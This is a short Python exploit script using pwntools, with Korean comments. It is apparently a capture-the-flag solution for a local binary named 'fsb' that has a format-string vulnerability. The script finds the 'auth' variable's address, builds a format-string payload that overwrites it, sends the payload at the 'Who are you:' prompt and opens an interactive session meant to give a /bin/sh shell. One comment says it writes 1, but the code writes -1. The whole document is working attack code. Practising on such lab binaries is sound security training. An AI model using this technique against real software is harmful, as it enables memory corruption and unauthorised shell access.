from pwn import *

# 바이너리 로드
binary = ELF('./fsb')
context.bits=64
# 주소 계산
auth_addr = binary.symbols['auth']
log.info(f"auth address: {hex(auth_addr)}")

# 프로그램 실행
p = process('./fsb')

# auth 변수에 1 쓰기
payload = fmtstr_payload(6, {auth_addr: -1})
p.sendafter(b"Who are you: ",payload)

# /bin/sh 실행
p.interactive()